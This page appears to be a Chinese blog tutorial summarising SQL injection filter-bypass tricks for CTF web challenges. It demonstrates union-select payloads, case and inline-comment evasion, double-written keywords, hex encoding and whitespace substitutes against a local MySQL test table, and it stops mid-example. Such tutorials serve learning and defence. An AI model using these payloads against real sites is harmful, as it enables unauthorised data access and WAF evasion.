<!DOCTYPE html><html lang="ch-ZN"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1,minimum-scale=1" name="viewport"><meta content="ie=edge" http-equiv="X-UA-Compatible"><meta content="#fff" name="theme-color" id="theme-color"><meta content="这是pankas的小站~(-V-)~欢迎访问" name="description"><link href="/icon/logo.png" rel="icon"><title>SQL注入绕过的简单总结</title><meta content="SQL注入绕过的简单总结" property="og:title"><meta content="https://pankas.top/2022/03/18/sqlInjectSummary/index.html" property="og:url"><meta content="/img/sqlInjectSummary.jpg" property="og:img"><meta content="这是pankas的小站~(-V-)~欢迎访问" property="og:img"><meta content="article" property="og:type"><meta content="2022-03-18" property="og:article:published_time"><meta content="2022-03-21" property="og:article:modified_time"><meta content="pankas" property="og:article:author"><meta content="SQL" property="og:article:tag"><meta content="SQL注入绕过" property="og:article:tag"><script>function loadScript(e,t){var n=document.createElement("script");n.src=e,t&&(n.onload=t),n.async=!0,document.body.appendChild(n)}function loadCSS(e,t,n){var a=document.createElement("link");a.ref="stylesheet",a.href=e,a.dataset[t]=n,document.head.appendChild(a)}function changeCSS(e,t,n){var t=document.querySelector(t),a=document.createElement("link");a.setAttribute("rel","stylesheet"),a.setAttribute("href",e),a.dataset.prism=n,document.head.replaceChild(a,t)}</script><script>function prismThemeChange(){"dark"===document.getElementById("theme-color").dataset.mode?document.querySelector("[data-prism]")?changeCSS("/js/lib/prism/prism-tomorrow.min.css","[data-prism]","prism-tomorrow"):loadCSS("/js/lib/prism/prism-tomorrow.min.css","prism","prism-tomorrow"):document.querySelector("[data-prism]")?changeCSS("/js/lib/prism/prism.min.css","[data-prism]","prism"):loadCSS("/js/lib/prism/prism.min.css","prism","prism")}prismThemeChange()</script><link href="/js/lib/prism/prism-line-numbers.min.css" rel="stylesheet"><script>var reverseDarkList={dark:"light",light:"dark"},themeColor={dark:"#1c1c1e",light:"#fff"},getCssMediaQuery=function(){return window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"},reverseDarkModeSetting=function(){var e=localStorage.getItem("user-color-scheme");if(reverseDarkList[e])e=reverseDarkList[e];else{if(null!==e)return;e=reverseDarkList[getCssMediaQuery()]}return localStorage.setItem("user-color-scheme",e),e}</script><script>var setDarkmode=function(e){(e=e||localStorage.getItem("user-color-scheme"))===getCssMediaQuery()?(document.documentElement.removeAttribute("data-user-color-scheme"),localStorage.removeItem("user-color-scheme"),document.getElementById("theme-color").content=themeColor[e],document.getElementById("theme-color").dataset.mode=e):reverseDarkList[e]?(document.documentElement.setAttribute("data-user-color-scheme",e),document.getElementById("theme-color").content=themeColor[e],document.getElementById("theme-color").dataset.mode=e):(document.documentElement.removeAttribute("data-user-color-scheme"),localStorage.removeItem("user-color-scheme"),document.getElementById("theme-color").content=themeColor[getCssMediaQuery()],document.getElementById("theme-color").dataset.mode=getCssMediaQuery()),prismThemeChange()};setDarkmode()</script><link href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" rel="preload" as="style"><link href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" rel="preload" as="style"><link href="/js/lib/lightbox/baguetteBox.min.js" rel="preload" as="script"><link href="/js/lib/lightbox/baguetteBox.min.css" rel="preload" as="style"><link href="/js/lib/lozad.min.js" rel="preload" as="script"><link href="/css/main.css" rel="stylesheet"><link href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" rel="stylesheet"><link href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" rel="stylesheet"><link href="/js/lib/lightbox/baguetteBox.min.css" rel="stylesheet"><meta content="Hexo 6.0.0" name="generator"></head><body><div class="wrapper"><nav class="navbar"><div class="navbar-logo"><span class="navbar-logo-main"><img alt="blog logo" class="navbar-logo-img" src="/icon/logo.png" height="32" width="32"> <span class="navbar-logo-dsc">pankas'blog</span></span></div><div class="navbar-menu"><a href="/" class="navbar-menu-item">首页 </a><a href="/archives" class="navbar-menu-item">归档 </a><a href="/tags" class="navbar-menu-item">标签 </a><a href="/categories" class="navbar-menu-item">分类 </a><a href="/about" class="navbar-menu-item">关于 </a><a href="/links" class="navbar-menu-item">友链 </a><a class="navbar-menu-item darknavbar" id="dark"><i class="iconfont icon-weather"></i> </a><a class="navbar-menu-item searchnavbar" id="search"><i class="iconfont icon-search" style="font-size:1.2rem;font-weight:400"></i></a></div></nav><div id="local-search" style="display:none"><input class="navbar-menu-item" id="search-input" placeholder="请输入搜索内容..."><div id="search-content"></div></div><div class="section-wrap"><div class="container"><div class="columns"><main class="main-column"><div class="image-wrapper"><img alt="SQL注入绕过的简单总结 thumbnail" class="image lozad" src="/img/sqlInjectSummary.jpg" data-src="/img/sqlInjectSummary.jpg" srcset="data:image/svg+xml,%3Csvg%20xmlns=&#39;http://www.w3.org/2000/svg&#39;%20viewBox=&#39;0%200%20300%20300&#39;%3E%3C/svg%3E"></div><article class="card card-content"><header><h1 class="post-title">SQL注入绕过的简单总结</h1></header><div class="post-meta post-show-meta"><time datetime="2022-03-18T08:49:36.000Z"><i class="iconfont icon-calendar" style="margin-right:2px"></i> <span>2022-03-18</span> </time><span class="dot"></span> <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-meta-link">SQL注入 </a><span class="dot"></span> <span>2.9k 字</span></div><div class="post-meta post-show-meta" style="margin-top:-10px"><div style="display:flex;align-items:center"><i class="iconfont icon-biaoqian" style="margin-right:2px;font-size:1.15rem"></i> <a href="/tags/SQL/" class="post-meta-link">SQL </a><span class="dot"></span> <a href="/tags/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" class="post-meta-link">SQL注入绕过</a></div></div><div class="post-content" id="section"><p>新人web手对sql注入的一些简单总结</p><h2 id="SQL语法学习"><a href="#SQL语法学习" class="headerlink" title="SQL语法学习"></a>SQL语法学习</h2><p>基础必学要打牢，首先要会SQL查询语句才能会SQL注入嘛，<a href="https://www.w3school.com.cn/sql/sql_syntax.asp" rel="noopener" target="_blank">学习网站</a></p><h2 id="常用函数介绍"><a href="#常用函数介绍" class="headerlink" title="常用函数介绍"></a>常用函数介绍</h2><ul><li><p><strong>COUNT(column_name)</strong> 函数返回指定列的值的数目（NULL 不计入）：</p></li><li><p><strong>COUNT()</strong> 函数返回表中的记录数：</p></li></ul><ul><li><strong>ASCII(<em>str</em>)</strong> 返回值为字符串<em>str</em> 的最左字符的ASCII值。假如<em>str</em>为空字符串，则返回值为 0 。</li><li><strong>ORD(<em>char</em>)</strong> 返回字符的 ASCII 值</li><li><strong>GROUP_CONCAT(<em>expr</em>)</strong> 该函数返回带有来自一个组的连接的非NULL值的字符串结果。即将<em>expr</em>的数据整合到一起。</li><li>CHAR(<em>ascii,…</em>)将一个或多个ascii码( <code>,</code>分隔)转为字符或字符串。</li><li><strong>CONCAT(<em>str1</em>,<em>str2</em>,…)</strong> 返回结果为连接参数产生的字符串。</li><li><strong>LENGTH(<em>str</em>)</strong> 返回值为字符串<em>str</em> 的长度，单位为字节。</li></ul><ul><li><p><strong>SUBSTR(<em>str</em>,<em>start</em>,<em>len</em>)</strong> 返回<em>start</em>开始，长度为<em>len</em>的字符串。注意:字符串起始位置为1。</p></li><li><p><strong>MID()</strong> 用法和上述一样。</p></li><li><p><strong>LEFT(<em>str</em>,<em>len</em>)</strong> 返回字符串<em>str</em>自最左边开始的<em>len</em>个字符。</p></li><li><p>RIGHT(<em>str,len</em>)返回字符串<em>str</em>自最右边开始的<em>len</em>个字符。</p></li><li><p><strong>REVERSE(<em>str</em>)</strong> 反转字符串。</p></li><li><p><strong>IF(<em>语句0,语句1,语句2</em>)</strong> 若 <em><strong>语句0</strong></em> 为真则执行 <em><strong>语句1</strong></em>，否则执行<em><strong>语句2</strong></em></p></li><li><p><strong>LPAD(<em>str,len,padstr</em>)</strong> 返回字符串 <em>str</em>, 其左边由字符串<em>padstr</em> 填补到<em>len</em> 字符长度。假如<em>str</em> 的长度大于<em>len</em>, 则返回值被缩短至 <em>len</em> 字符。</p></li><li><p>RPAD(<em>str,len,padstr</em>)返回字符串<em>str</em>, 其右边被字符串<em>padstr</em>填补至<em>len</em>字符长度。假如字符串<em>str</em> 的长度大于<em>len</em>,则返回值被缩短到与<em>len</em> 字符相同长度。</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">SELECT</span> LPAD<span class="token punctuation">(</span><span class="token string">'hi'</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'??'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'??hi'</span>
mysql<span class="token operator">></span> <span class="token keyword">SELECT</span> LPAD<span class="token punctuation">(</span><span class="token string">'hi'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'??'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'h'</span>
        
mysql<span class="token operator">></span> <span class="token keyword">SELECT</span> RPAD<span class="token punctuation">(</span><span class="token string">'hi'</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'hi???'</span>
mysql<span class="token operator">></span> <span class="token keyword">SELECT</span> RPAD<span class="token punctuation">(</span><span class="token string">'hi'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'h'</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>sleep(duration)</strong> 睡眠(暂停) 时间为<em>duration</em> 参数给定的秒数，然后返回 0。</p></li><li><p><strong>database()</strong> 获取当前数据库名。</p></li></ul><h2 id="常用运算符和关键字"><a href="#常用运算符和关键字" class="headerlink" title="常用运算符和关键字"></a>常用运算符和关键字</h2><ul><li><code>union</code>用于联合查询 (<strong>注意:必须要有相同的字段数，注入时通常先用order by 测试下有几个字段</strong>)</li><li><code>&#39;</code>用于闭合语句</li><li><em><strong>不带引号的以 <code>0X</code> 开头的十六进制值在MYSQL中会被解释为对应的字符串。</strong></em></li><li>反引号 用于区分MYSQL的保留字与普通字符而引入的符号，如：</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span><span class="token identifier"><span class="token punctuation">`</span>select<span class="token punctuation">`</span></span><span class="token keyword">from</span><span class="token identifier"><span class="token punctuation">`</span>test<span class="token punctuation">`</span></span><span class="token keyword">WHERE</span><span class="token identifier"><span class="token punctuation">`</span>select<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token string">'字段值'</span><span class="token punctuation">;</span><span class="token comment">#未使用空格，是一种绕过方式</span><span class="line-numbers-rows" aria-hidden="true"><span></span></span></code></pre><ul><li>不等于 <code>!=</code> 或<code>&lt;&gt;</code>，取非 <code>!</code> 或<code>not</code></li><li><em><strong><code>= in like regexp !(语句&lt;&gt;语句)</code>这几个关键字等价，如:</strong></em></li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> myTable <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> myTable <span class="token keyword">where</span> id <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">#in后面参数必须加(),()中可匹配多个，用,分隔</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> myTable <span class="token keyword">where</span> id <span class="token operator">like</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">#like可加通配符%进行模糊匹配</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> myTable <span class="token keyword">where</span> id <span class="token operator">regexp</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">#regexp可用于正则匹配</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> myTable <span class="token keyword">where</span> <span class="token operator">!</span><span class="token punctuation">(</span>id<span class="token operator">&lt;></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这几个句子等价。</p><ul><li><p>比较运算符,大于小于号<code>&gt; &lt;</code>，<code>between A and B</code>(A和B是参数)</p></li><li><p><code>information_schema</code> 在mysql中包含所有的数据库的相关信息，其中的information_schema.tables 和information_schema.columns 经常用到，（table_schema，table_name）和column_name分别是其字段名之一。table_schema是数据库名，table_name是表名，column_name是字段名。</p></li><li><p>圆括号　<code>(...)</code> 使用括弧来规定表达式的运算顺序，例如：</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token comment"># 9</span>
<span class="token keyword">select</span><span class="token punctuation">(</span>some_column<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>myTable<span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#未使用空格</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span></span></code></pre></li><li><p>注释符 <code># /**/</code></p></li><li><p>与运算符 <code>and &amp;&amp;</code></p></li><li><p>或运算符 <code>or ||</code></p></li><li><p>异或运算符 <code>^ xor</code></p><p>注意：如果在浏览器中地址栏输入要进行url编码,<code>&amp; urlencode后为 %26 #为%23</code></p></li><li><p>from <em>num1</em> for <em>num2</em> 可用于substr(<em>str</em>,<em>start</em>,<em>end</em>)等 代替 <code>,</code>如：</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
等价于
substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="常用绕过方法"><a href="#常用绕过方法" class="headerlink" title="常用绕过方法"></a>常用绕过方法</h2><h3 id="注释符号绕过"><a href="#注释符号绕过" class="headerlink" title="注释符号绕过"></a>注释符号绕过</h3><p>常用的注释符有</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql"><span class="token comment">-- 注释内容</span>
<span class="token comment"># 注释内容</span>
<span class="token comment">/*注释内容*/</span>
<span class="token punctuation">;</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span></span></code></pre><p>实例</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token comment">-- where id = 1;</span>
    <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> user2    <span class="token operator">|</span> pass1    <span class="token operator">|</span>
<span class="token number">1234567</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token comment"># where id = 2;</span>
    <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> user2    <span class="token operator">|</span> pass1    <span class="token operator">|</span>
<span class="token number">1234567</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">3</span> <span class="token comment">/*+1*/</span>
    <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> test3    <span class="token operator">|</span> pass1    <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>常用于 <code>waf</code>的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。<br>例如：waf过滤了关键字<code>select</code>，可以尝试使用<code>Select</code>等绕过。</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span>
    <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>        <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

<span class="token comment">#大小写绕过</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">Select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>        <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>内联注释就是把一些特有的仅在MYSQL上的语句放在 <code>/*!...*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token comment">/*!select*/</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>        <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h3><p>在某一些简单的<code>waf</code>中，将关键字<code>select</code>等只使用<code>replace()</code>函数置换为空，这时候可以使用双写关键字绕过。例如<code>select</code>变成<code>seleselectct</code>，在经过<code>waf</code>的处理之后又变成<code>select</code>，达到绕过的要求。</p><h3 id="特殊编码绕过"><a href="#特殊编码绕过" class="headerlink" title="特殊编码绕过"></a>特殊编码绕过</h3><ul><li>十六进制绕过</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token number">0x7465737431</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ascii编码绕过<br><code>Test</code> 等价于<br><code>CHAR(101,97,115,116)</code></li></ul><h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>一般绕过空格过滤的方法有以下几种方法来取代空格</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql"><span class="token comment">/**/</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span>
回车<span class="token punctuation">(</span>url编码中的<span class="token operator">%</span><span class="token number">0</span>a<span class="token punctuation">)</span>
<span class="token punctuation">`</span> 反引号绕过
tap
两个空格<span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实例</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span><span class="token comment">/**/</span><span class="token operator">*</span><span class="token comment">/**/</span><span class="token keyword">from</span><span class="token comment">/**/</span>users<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> user2    <span class="token operator">|</span> pass1    <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> test3    <span class="token operator">|</span> pass1    <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token comment">#注意括号中不能含有*</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+</span>
<span class="token operator">|</span> id <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span>
<span class="token comment">#回车符 %0a</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span>
    <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">*</span>
    <span class="token operator">-</span><span class="token operator">></span> <span class="token keyword">from</span> 
    <span class="token operator">-</span><span class="token operator">></span> users
    <span class="token operator">-</span><span class="token operator">></span> <span class="token keyword">where</span> 
    <span class="token operator">-</span><span class="token operator">></span> id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span><span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token keyword">from</span><span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span><span class="token keyword">where</span><span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+</span>
<span class="token operator">|</span> id <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="过滤or-and-xor-not-绕过"><a href="#过滤or-and-xor-not-绕过" class="headerlink" title="过滤or and xor not 绕过"></a>过滤or and xor not 绕过</h3><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql"><span class="token operator">and</span> <span class="token operator">=</span> <span class="token operator">&amp;&amp;</span>
<span class="token operator">or</span> <span class="token operator">=</span> <span class="token operator">||</span>
<span class="token operator">xor</span> <span class="token operator">=</span> <span class="token operator">|</span> <span class="token comment"># 异或</span>
<span class="token operator">not</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="过滤等号-x3D-绕过"><a href="#过滤等号-x3D-绕过" class="headerlink" title="过滤等号&#x3D;绕过"></a>过滤等号&#x3D;绕过</h3><ul><li>不加<code>通配符</code>的<code>like</code>执行的效果和<code>=</code>一致，所以可以用来绕过。</li></ul><p>正常加上通配符的<code>like</code>：</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username <span class="token operator">like</span> <span class="token string">"test%"</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> test3    <span class="token operator">|</span> pass1    <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不加上通配符的<code>like</code>可以用来取代<code>=</code>：</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">like</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
